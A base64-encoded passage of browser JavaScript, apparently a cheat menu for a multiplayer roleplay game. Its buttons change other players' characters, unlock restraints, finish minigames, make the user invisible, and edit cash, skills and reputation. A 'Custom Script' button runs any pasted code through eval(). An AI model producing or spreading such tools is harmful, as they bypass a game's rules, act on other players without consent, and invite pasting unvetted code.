kxOTU3NDgvYjY2NDE5MTE3ODk3YTk4OC5wbmc/d2lkdGg9MTE5MCZoZWlnaHQ9MTE4OSI7CiAgICBpY29uLnN0eWxlLndpZHRoID0gIjIzcHgiOwogICAgaWNvbi5zdHlsZS5oZWlnaHQgPSAiMjNweCI7CiAgICBpY29uLnN0eWxlLmJvcmRlclJhZGl1cyA9ICI1MCUiOwogICAgaWNvbi5zdHlsZS5tYXJnaW5SaWdodCA9ICItMzBweCI7CiAgICBpY29uLnN0eWxlLm1hcmdpbkJvdHRvbSA9ICItNXB4IjsKICAgIHRvYXN0Q29udGFpbmVyLmFwcGVuZENoaWxkKGljb24pOwogICAgCiAgICAvLyBNYWludGVuYW5jZSBUZXh0CiAgICB2YXIgdGV4dCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNwYW4iKTsKICAgIHRleHQuc3R5bGUuZm9udFdlaWdodCA9ICJib2xkIjsKICAgIHRleHQuc3R5bGUubWFyZ2luTGVmdCA9ICIzNXB4IjsKICAgIHRleHQuaW5uZXJIVE1MID0gIkJDTUUgc2VydmVycyBhcmUgdW5kZXIgbWFpbnRhaW5hbmNlLCB0cnkgYWdhaW4gbGF0ZXIiOwogICAgdG9hc3RDb250YWluZXIuYXBwZW5kQ2hpbGQodGV4dCk7CgogICAgICAKICAgICAgICAvLyBBcHBlbmQgdGhlIHRvYXN0IGNvbnRhaW5lciB0byBCQydzIGJvZHkKICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHRvYXN0Q29udGFpbmVyKTsKICAgICAgCiAgICAgICAgLy8gVG9hc3QncyBmYWRlLWluIGFuaW1hdGlvbgogICAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsKICAgICAgICAgIHRvYXN0Q29udGFpbmVyLnN0eWxlLm9wYWNpdHkgPSAiMSI7CiAgICAgICAgfSwgMCk7CiAgICAgIAogICAgICAgIC8vIEhpZGUgdG9hc3Qgd2l0aCBhIGZhZGUgb3V0IGFuaW1hdGlvbgogICAgICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgICB0b2FzdENvbnRhaW5lci5zdHlsZS5vcGFjaXR5ID0gIjAiOwogICAgICAgIH0sIDUwMDAwMDApOwogICAgICAKICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgICAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICAgICAgICB9LCA1NTAwMDAwKTsKICAgICAgfSAKICAgICAgc2hvd1RvYXN0TWFpbnQoKTsgICAgIAogICAgICB0aHJvdyBuZXcgRXJyb3IoJ0V4ZWN1dGlvbiBzdG9wcGVkLicpOyAvLyBzdG9wIGV4ZWN1dGluZyB0aGUgcmVzdCBvZiB0aGUgY29kZQogICAgfSBlbHNlIHsKCgovL1N0YXJ0IE9mIENvbnRleHQgTWVudV9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fCgovL0Rlc2t0b3AgTWVudV9fX19fX19fX19fX19fX19fX19fX19fCnZhciB2aXNiID0gdHJ1ZTsKLy9jb250ZXh0IE1lbnUKdmFyIGNvbnRleHRNZW51T3BlbiA9IGZhbHNlOwovLyBGdW5jdGlvbiB0byBjcmVhdGUgY3VzdG9tIGNvbnRleHQgbWVudSBidXR0b25zCmZ1bmN0aW9uIGNyZWF0ZUJ1dHRvbih0ZXh0LCBvbkNsaWNrKSB7CiAgICAgY29udGV4dE1lbnVPcGVuID0gdHJ1ZTsKICAgIHZhciBidXR0b24gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICAgIGJ1dHRvbi5pbm5lckhUTUwgPSB0ZXh0OwogICAgYnV0dG9uLm9uY2xpY2sgPSBvbkNsaWNrOwogICAgYnV0dG9uLnN0eWxlLndpZHRoID0gIjEwMCUiOwogICAgYnV0dG9uLnN0eWxlLnRleHRBbGlnbiA9ICJsZWZ0IjsKICAgIGJ1dHRvbi5zdHlsZS5wYWRkaW5nID0gIjVweCI7CiAgICBidXR0b24uc3R5bGUuY3Vyc29yID0gInBvaW50ZXIiOwogICAgcmV0dXJuIGJ1dHRvbjsKfQoKLy8gQ3JlYXRlIHNlcGFyYXRvciBmdW5jdGlvbgpmdW5jdGlvbiBjcmVhdGVTZXBhcmF0b3IoKSB7CiAgICB2YXIgc2VwYXJhdG9yID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaHIiKTsKICAgIHNlcGFyYXRvci5zdHlsZS5tYXJnaW4gPSAiNXB4IDAiOwogICAgcmV0dXJuIHNlcGFyYXRvcjsKfQoKLy8gRnVuY3Rpb24gdG8gZGlzcGxheSBjdXN0b20gY29udGV4dCBtZW51X19fX18KbGV0IGNvbnRleHRNZW51VGltZXIgPSBudWxsOwpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJjb250ZXh0bWVudSIsIGZ1bmN0aW9uKGV2ZW50KSB7CiAgaWYgKGNvbnRleHRNZW51T3BlbikgewogICAgZXZlbnQucHJldmVudERlZmF1bHQoKTsKICAgIHJldHVybjsgLy8gUHJldmVudCBkdXBlIG1lbnVzCiAgfQogIGlmICh3aW5kb3cuZ2V0U2VsZWN0aW9uKCkudG9TdHJpbmcoKSAhPT0gJycpIHsKICAgIC8vIEFsbG93IHJlZ3VsYXIgY29udGV4dCBtZW51IHdoZW4gdGV4dCBpcyBoaWdobGlnaHRlZAogICAgcmV0dXJuOwogIH0KICBldmVudC5wcmV2ZW50RGVmYXVsdCgpOwogIHZhciBjb250ZXh0TWVudSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogIGNvbnRleHRNZW51LnN0eWxlLnBvc2l0aW9uID0gImZpeGVkIjsKICBjb250ZXh0TWVudS5zdHlsZS5iYWNrZ3JvdW5kID0gImxpbmVhci1ncmFkaWVudCh0byBib3R0b20sIHdoaXRlLCB3aGl0ZSkiOwogIGNvbnRleHRNZW51LnN0eWxlLmJveFNoYWRvdyA9ICIwIDAgM3B4ICM5OTkiOwogIGNvbnRleHRNZW51LnN0eWxlLmJvcmRlclJhZGl1cyA9ICI4cHgiOwogIGNvbnRleHRNZW51LnN0eWxlLnpJbmRleCA9ICI5OTk5IjsKICBjb250ZXh0TWVudS5zdHlsZS5ib3JkZXIgPSAiMnB4IHNvbGlkIGJsYWNrIjsKICBjb250ZXh0TWVudU9wZW4gPSB0cnVlOwogIGlmICgnb250b3VjaHN0YXJ0JyBpbiB3aW5kb3cpIHsKICAgIC8vIEhhbmRsZSBsb25nIHByZXNzIG9uIG1vYmlsZSBkZXZpY2VzCiAgICBjb250ZXh0TWVudVRpbWVyID0gc2V0VGltZW91dChmdW5jdGlvbigpIHsKICAgICAgY29udGV4dE1lbnUuc3R5bGUudG9wID0gZXZlbnQudG91Y2hlc1swXS5jbGllbnRZICsgInB4IjsKICAgICAgY29udGV4dE1lbnUuc3R5bGUubGVmdCA9IGV2ZW50LnRvdWNoZXNbMF0uY2xpZW50WCArICJweCI7CiAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoY29udGV4dE1lbnUpOwogICAgICBjb250ZXh0TWVudU9wZW4gPSB0cnVlOwogICAgfSwgNTAwKTsKICB9IGVsc2UgewogICAgLy8gSGFuZGxlIHJpZ2h0IGNsaWNrIG9uIGRlc2t0b3AgZGV2aWNlcwogICAgY29udGV4dE1lbnUuc3R5bGUudG9wID0gZXZlbnQuY2xpZW50WSArICJweCI7CiAgICBjb250ZXh0TWVudS5zdHlsZS5sZWZ0ID0gZXZlbnQuY2xpZW50WCArICJweCI7CiAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGNvbnRleHRNZW51KTsKICAgIGNvbnRleHRNZW51T3BlbiA9IHRydWU7CiAgfQogIGRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgZnVuY3Rpb24oKSB7CiAgICBjb250ZXh0TWVudS5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogICAgY29udGV4dE1lbnVPcGVuID0gZmFsc2U7CiAgICBjbGVhclRpbWVvdXQoY29udGV4dE1lbnVUaW1lcik7CiAgfSk7CiAgICAKCgogICAgLy8gSGVhZGVyIHdpdGggQkNNIGxvZ28KICAgIHZhciBoZWFkZXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICAgIGhlYWRlci5zdHlsZS5kaXNwbGF5ID0gImZsZXgiOwogICAgaGVhZGVyLnN0eWxlLmFsaWduSXRlbXMgPSAiY2VudGVyIjsKICAgIGhlYWRlci5zdHlsZS5wYWRkaW5nID0gIjVweCI7CgogICAgdmFyIHByb2ZpbGVQaG90byA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImltZyIpOwogICAgcHJvZmlsZVBob3RvLnNyYyA9ICJodHRwczovL21lZGlhLmRpc2NvcmRhcHAubmV0L2F0dGFjaG1lbnRzLzc4MTc0OTIyOTMzMTkzOTMyOC8xMDc5NjU5MDE2OTE5MTk1NzQ4L2I2NjQxOTExNzg5N2E5ODgucG5nP3dpZHRoPTExOTAmaGVpZ2h0PTExODkiOwogICAgcHJvZmlsZVBob3RvLnN0eWxlLndpZHRoID0gIjMwcHgiOwogICAgcHJvZmlsZVBob3RvLnN0eWxlLmhlaWdodCA9ICIzMHB4IjsKICAgIHByb2ZpbGVQaG90by5zdHlsZS5ib3JkZXJSYWRpdXMgPSAiMjAlIjsKICAgIHByb2ZpbGVQaG90by5zdHlsZS5tYXJnaW5SaWdodCA9ICIxMHB4IjsKCiAgICB2YXIgaGVhZGVyVGV4dCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImRpdiIpOwogICAgaGVhZGVyVGV4dC5pbm5lckhUTUwgPSAiPGI+RXNzZW50aWFsczwvYj4iOwoKICAgIGhlYWRlci5hcHBlbmRDaGlsZChwcm9maWxlUGhvdG8pOwogICAgaGVhZGVyLmFwcGVuZENoaWxkKGhlYWRlclRleHQpOwoKIC8vIEN1c3RvbSBtYWluIGJ1dHRvbnMKIHZhciBidXR0b24xID0gY3JlYXRlQnV0dG9uKCJSZXN0b3JlIENoYXJhY3RlciIsIGZ1bmN0aW9uKCkgewogICAgamF2YXNjcmlwdDpQbGF5ZXIuQXBwZWFyYW5jZSA9IENoYXRTZWFyY2hTYWZld29yZEFwcGVhcmFuY2Uuc2xpY2UoMCk7ICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7ICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpOwogICAgc2hvd1RvYXN0c2NwZygpOwogICAgCn0pOwp2YXIgYnV0dG9uMiA9IGNyZWF0ZUJ1dHRvbigiRm9yY2UgUm9vbSBTd2FwIiwgZnVuY3Rpb24oKSB7CiAgICBqYXZhc2NyaXB0OkNoYXRTZWxlY3RTdGFydFNlYXJjaCgnWCcpLENoYXRSb29tU2V0TGFzdENoYXRSb29tKCcnKSxkb2N1bWVudFsnZ2V0RWxlbWVudEJ5SWQnXSgnSW5wdXRDaGF0JylbJ3N0eWxlJ11bJ2Rpc3BsYXknXT0nbm9uZScsZG9jdW1lbnRbJ2dldEVsZW1lbnRCeUlkJ10oJ1RleHRBcmVhQ2hhdExvZycpWydzdHlsZSddWydkaXNwbGF5J109J25vbmUnLENoYXRTZWxlY3RTdGFydFNlYXJjaCgnWCcpLENoYXRSb29tU2V0TGFzdENoYXRSb29tKCcnKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKfSk7CnZhciBidXR0b24zID0gY3JlYXRlQnV0dG9uKCJGcmVlIFRhcmdldCIsIGZ1bmN0aW9uKCkgewogICAgamF2YXNjcmlwdDpDaGFyYWN0ZXJSZWxlYXNlVG90YWwoQ3VycmVudENoYXJhY3RlciksQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoQ3VycmVudENoYXJhY3Rlcik7CiAgICBzaG93VG9hc3RzY3BnKCk7Cn0pOwp2YXIgYnV0dG9uNCA9IGNyZWF0ZUJ1dHRvbigiUmVtb3ZlIFJlc3RyYWludCIsIGZ1bmN0aW9uKCkgewogICAgamF2YXNjcmlwdDpJbnZlbnRvcnlVbmxvY2soQ3VycmVudENoYXJhY3RlciwgQ3VycmVudENoYXJhY3Rlci5Gb2N1c0dyb3VwLk5hbWUpOwogICAgSW52ZW50b3J5UmVtb3ZlKEN1cnJlbnRDaGFyYWN0ZXIsIEN1cnJlbnRDaGFyYWN0ZXIuRm9jdXNHcm91cC5OYW1lKTsKICAgIENoYXRSb29tQ2hhcmFjdGVySXRlbVVwZGF0ZShDdXJyZW50Q2hhcmFjdGVyLCBDdXJyZW50Q2hhcmFjdGVyLkZvY3VzR3JvdXAuTmFtZSk7CiAgICBzaG93VG9hc3RzY3BnKCk7Cn0pOwp2YXIgYnV0dG9uNSA9IGNyZWF0ZUJ1dHRvbigiVGFyZ2V0IFN0cnVnZ2xlIERpZmZpY3VsdHkiLCBmdW5jdGlvbigpIHsKICAgIGphdmFzY3JpcHQ6ZG97dmFyIGRpZmM9cHJvbXB0KCdEaWZmaWN1bHR5XHgyMDEtOTYnKTt9d2hpbGUoIShkaWZjPj0weDEmJmRpZmM8PTB4NjApKTsKICAgIEludmVudG9yeVNldERpZmZpY3VsdHkoQ3VycmVudENoYXJhY3RlciwgIkl0ZW1IZWFkIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtTW91dGgiLCBkaWZjKTsKICAgIEludmVudG9yeVNldERpZmZpY3VsdHkoQ3VycmVudENoYXJhY3RlciwgIkl0ZW1Nb3V0aDIiLCBkaWZjKTsKICAgIEludmVudG9yeVNldERpZmZpY3VsdHkoQ3VycmVudENoYXJhY3RlciwgIkl0ZW1Nb3V0aDMiLCBkaWZjKTsKICAgIEludmVudG9yeVNldERpZmZpY3VsdHkoQ3VycmVudENoYXJhY3RlciwgIkl0ZW1Bcm1zIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtSGFuZHMiLCBkaWZjKTsKICAgIEludmVudG9yeVNldERpZmZpY3VsdHkoQ3VycmVudENoYXJhY3RlciwgIkl0ZW1MZWdzIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtRXllcyIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbUZlZXQiLCBkaWZjKTsKICAgIEludmVudG9yeVNldERpZmZpY3VsdHkoQ3VycmVudENoYXJhY3RlciwgIkl0ZW1EZXZpY2VzIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtQWRkb24iLCBkaWZjKTsKICAgIEludmVudG9yeVNldERpZmZpY3VsdHkoQ3VycmVudENoYXJhY3RlciwgIkl0ZW1OZWNrIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtTmVja1Jlc3RyYWludHMiLCBkaWZjKTsKICAgIEludmVudG9yeVNldERpZmZpY3VsdHkoQ3VycmVudENoYXJhY3RlciwgIkl0ZW1OZWNrQWNjZXNzb3JpZXMiLCBkaWZjKTsKICAgIEludmVudG9yeVNldERpZmZpY3VsdHkoQ3VycmVudENoYXJhY3RlciwgIkl0ZW1Cb290cyIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbUhvb2QiLCBkaWZjKTsKICAgIEludmVudG9yeVNldERpZmZpY3VsdHkoQ3VycmVudENoYXJhY3RlciwgIkl0ZW1Ob3NlIiwgZGlmYyk7CiAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShDdXJyZW50Q2hhcmFjdGVyKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKfSk7CnZhciBidXR0b242ID0gY3JlYXRlQnV0dG9uKCJPcGVuIFRhcmdldCBXYXJkcm9iZSIsIGZ1bmN0aW9uKCkgewogICAgamF2YXNjcmlwdDpEaWFsb2dDaGFuZ2VDbG90aGVzKCk7CiAgICBzaG93VG9hc3RzY3BnKCk7Cn0pOwp2YXIgYnV0dG9uNyA9IGNyZWF0ZUJ1dHRvbigiQ29tcGxldGUgU3RydWdnbGUgTWluaWdhbWUiLCBmdW5jdGlvbigpIHsKICAgIGNvbnRleHRNZW51T3BlbiA9IGZhbHNlOwogICAgamF2YXNjcmlwdDpTdHJ1Z2dsZVByb2dyZXNzID0xMDAwOwogICAgY29udGV4dE1lbnUuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICAgIHNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgICAgICAgQ2hhdFJvb21DbGlja0NoYXJhY3RlcihQbGF5ZXIpOwogICAgICAgIERpYWxvZ0xlYXZlKCk7CiAgICB9LCA1MDApOwogICAgc2hvd1RvYXN0c2NwZygpOwp9KTsKCnZhciBidXR0b244ID0gY3JlYXRlQnV0dG9uKCJJbnZpc2libGUiLCBmdW5jdGlvbigpIHsKICAgIGphdmFzY3JpcHQ6SW52ZW50b3J5R2V0KFBsYXllciwgIkVtb3RpY29uIikuUHJvcGVydHkuT3ZlcnJpZGVIZWlnaHQgPSB7CiAgICAgIEhlaWdodDogIi0iCiAgICAgIH07CiAgICAgIEN1cnJlbnRTY3JlZW4gPT09ICJDaGF0Um9vbSIgPwogICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICAgICAgQ2hhcmFjdGVyUmVmcmVzaChQbGF5ZXIpOwogICAgICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpOyAKICAgICAgdmlzYiA9IGZhbHNlOwogICAgICBzaG93VG9hc3RzY3BnKCk7CiAgICAgIHVwZGF0ZUNvbnRleHRNZW51KCk7IAoKICAgIAp9KTsKCnZhciBidXR0b245ID0gY3JlYXRlQnV0dG9uKCJWaXNpYmxlIiwgZnVuY3Rpb24oKSB7CiAgamF2YXNjcmlwdDpDaGFyYWN0ZXJTZXRBY3RpdmVQb3NlKFBsYXllciwgbnVsbCk7CiAgZGVsZXRlIEludmVudG9yeUdldChQbGF5ZXIsICdFbW90aWNvbicpLlByb3BlcnR5Lk92ZXJyaWRlSGVpZ2h0OwogIEN1cnJlbnRTY3JlZW4gPT09ICdDaGF0Um9vbScgPwogIENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKFBsYXllcikgOgogIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgdmlzYiA9IHRydWU7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICB1cGRhdGVDb250ZXh0TWVudSgpOyAKICAKfSk7Cgp2YXIgYnV0dG9uMTAgPSBjcmVhdGVCdXR0b24oIkN1c3RvbSBTY3JpcHQiLCBmdW5jdGlvbigpIHsKICBqYXZhc2NyaXB0OnZhciBzY3JwID0gcHJvbXB0KCJQYXN0ZSB5b3VyIHNjcmlwdCBoZXJlOiIpOwogIGlmIChzY3JwKSB7CiAgICBldmFsKHNjcnApOwogICAgc2hvd1RvYXN0c2NwZygpOwogIH0KfSk7Ci8vIFRyYW5zaXRpb24gc3R5bGluZyBmb3IgdGhlIGJ1dHRvbnMKYnV0dG9uMS5zdHlsZS50cmFuc2l0aW9uID0gImJhY2tncm91bmQtY29sb3IgMC4ycyBlYXNlLWluLW91dCI7CmJ1dHRvbjIuc3R5bGUudHJhbnNpdGlvbiA9ICJiYWNrZ3JvdW5kLWNvbG9yIDAuMnMgZWFzZS1pbi1vdXQiOwpidXR0b24zLnN0eWxlLnRyYW5zaXRpb24gPSAiYmFja2dyb3VuZC1jb2xvciAwLjJzIGVhc2UtaW4tb3V0IjsKYnV0dG9uNC5zdHlsZS50cmFuc2l0aW9uID0gImJhY2tncm91bmQtY29sb3IgMC4ycyBlYXNlLWluLW91dCI7CmJ1dHRvbjUuc3R5bGUudHJhbnNpdGlvbiA9ICJiYWNrZ3JvdW5kLWNvbG9yIDAuMnMgZWFzZS1pbi1vdXQiOwpidXR0b242LnN0eWxlLnRyYW5zaXRpb24gPSAiYmFja2dyb3VuZC1jb2xvciAwLjJzIGVhc2UtaW4tb3V0IjsKYnV0dG9uNy5zdHlsZS50cmFuc2l0aW9uID0gImJhY2tncm91bmQtY29sb3IgMC4ycyBlYXNlLWluLW91dCI7CmJ1dHRvbjguc3R5bGUudHJhbnNpdGlvbiA9ICJiYWNrZ3JvdW5kLWNvbG9yIDAuMnMgZWFzZS1pbi1vdXQiOwpidXR0b245LnN0eWxlLnRyYW5zaXRpb24gPSAiYmFja2dyb3VuZC1jb2xvciAwLjJzIGVhc2UtaW4tb3V0IjsKYnV0dG9uMTAuc3R5bGUudHJhbnNpdGlvbiA9ICJiYWNrZ3JvdW5kLWNvbG9yIDAuMnMgZWFzZS1pbi1vdXQiOwoKCgovL0hvdmVyIGV2ZW50cyBmb3IgdGhlIGJ1dHRvbnMKYnV0dG9uMS5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW92ZXIiLCBmdW5jdGlvbigpIHsKICAgIHRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkZGRkZGQiOwogICAgdGhpcy5zdHlsZS53aWR0aCA9ICIxOTBweCI7CiAgICB9KTsKYnV0dG9uMS5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW91dCIsIGZ1bmN0aW9uKCkgewogICAgdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiIjsKICAgIH0pOwoKYnV0dG9uMi5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW92ZXIiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2RkZGRkZCI7CnRoaXMuc3R5bGUud2lkdGggPSAiMTkwcHgiOwp9KTsKYnV0dG9uMi5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW91dCIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIiOwp9KTsKCmJ1dHRvbjMuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdmVyIiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkZGRkZGQiOwp0aGlzLnN0eWxlLndpZHRoID0gIjE5MHB4IjsKfSk7CmJ1dHRvbjMuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdXQiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiIjsKfSk7CgpidXR0b240LmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3ZlciIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZGRkZGRkIjsKdGhpcy5zdHlsZS53aWR0aCA9ICIxOTBweCI7Cn0pOwpidXR0b240LmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3V0IiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiI7Cn0pOwoKYnV0dG9uNS5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW92ZXIiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2RkZGRkZCI7CnRoaXMuc3R5bGUud2lkdGggPSAiMTkwcHgiOwp9KTsKYnV0dG9uNS5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW91dCIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIiOwp9KTsKCmJ1dHRvbjYuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdmVyIiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkZGRkZGQiOwp0aGlzLnN0eWxlLndpZHRoID0gIjE5MHB4IjsKfSk7CmJ1dHRvbjYuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdXQiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiIjsKfSk7CgpidXR0b243LmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3ZlciIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZGRkZGRkIjsKdGhpcy5zdHlsZS53aWR0aCA9ICIxOTAuNXB4IjsKfSk7CmJ1dHRvbjcuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdXQiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiIjsKfSk7CgpidXR0b244LmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3ZlciIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZGRkZGRkIjsKdGhpcy5zdHlsZS53aWR0aCA9ICIxOTBweCI7Cn0pOwpidXR0b244LmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3V0IiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiI7Cn0pOwoKYnV0dG9uOS5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW92ZXIiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2RkZGRkZCI7CnRoaXMuc3R5bGUud2lkdGggPSAiMTkwcHgiOwp9KTsKYnV0dG9uOS5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW91dCIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIiOwp9KTsKCmJ1dHRvbjEwLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3ZlciIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZGRkZGRkIjsKdGhpcy5zdHlsZS53aWR0aCA9ICIxOTBweCI7Cn0pOwpidXR0b24xMC5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW91dCIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIiOwp9KTsKCi8vRHJvcGRvd24gTWVudV9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXwoKZnVuY3Rpb24gZm9yY2VjbG9zZW1lbnUoKSB7CiAgICAgIGNvbnRleHRNZW51LnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICAgIENoYXRSb29tQ2xpY2tDaGFyYWN0ZXIoUGxheWVyKTsKICAgICAgRGlhbG9nTGVhdmUoKTsKICBjb250ZXh0TWVudU9wZW4gPSBmYWxzZTsKICB9CgogLy8gQ3JlYXRlIHRoZSBkcm9wZG93biBtZW51CnZhciBzZWxlY3QgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzZWxlY3QiKTsKc2VsZWN0LnN0eWxlLmJvcmRlclJhZGl1cyA9ICIycHgiOwpzZWxlY3Quc3R5bGUucGFkZGluZyA9ICI0cHgiOwpzZWxlY3Quc3R5bGUud2lkdGggPSAiMjAwcHgiOwpzZWxlY3Quc3R5bGUubWFyZ2luVG9wID0gIi0yMHB4IjsKc2VsZWN0LnN0eWxlLm1hcmdpblJpZ2h0ID0gIjJweCI7CnNlbGVjdC5zdHlsZS5tYXJnaW5Cb3R0b20gPSAiM3B4IjsKc2VsZWN0LnN0eWxlLm1hcmdpbkxlZnQgPSAiMnB4IjsKdmFyIG9wdGlvbjEgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uMS52YWx1ZSA9ICJvcHQxIjsKb3B0aW9uMS50ZXh0ID0gIlBlcnNvbmFsaXNhdGlvbiBNZW51IjsKb3B0aW9uMS5zZWxlY3RlZCA9IHRydWU7Cm9wdGlvbjEuZGlzYWJsZWQgPSB0cnVlOwp2YXIgb3B0aW9uMiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb24yLnZhbHVlID0gIm9wdDIiOwpvcHRpb24yLnRleHQgPSAiRWRpdCBDYXNoIjsKdmFyIG9wdGlvbjMgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uMy52YWx1ZSA9ICJvcHQzIjsKb3B0aW9uMy50ZXh0ID0gIk1heCBTa2lsbHMiOwp2YXIgb3B0aW9uNCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb240LnZhbHVlID0gIm9wdDQiOwpvcHRpb240LnRleHQgPSAiTWF4IFJlcHV0YXRpb24iOwp2YXIgb3B0aW9uNSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb241LnZhbHVlID0gIm9wdDUiOwpvcHRpb241LnRleHQgPSAiUHVyY2hhc2UgRXZlcnl0aGluZyI7CnZhciBvcHRpb242ID0gZG9jdW1lbnQuY3JlYXRlRWxlb